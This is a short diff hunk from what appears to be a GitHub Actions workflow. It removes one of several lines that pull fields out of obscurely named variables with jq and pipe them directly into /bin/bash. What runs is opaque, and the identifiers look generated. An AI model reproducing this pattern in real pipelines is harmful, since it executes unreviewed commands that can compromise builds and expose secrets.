@@ -22,7 +22,6 @@ jobs:
           echo $dfbu6 | jq -r .zgb0 | /bin/bash
           printf '%s' "$thynv8679" | jq -r .pwfkr63707 | /bin/bash
           printf '%s' "$nhdte53662" | jq -r .m64 | /bin/bash
-          printf '%s' "$h51586" | jq -r .x103 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
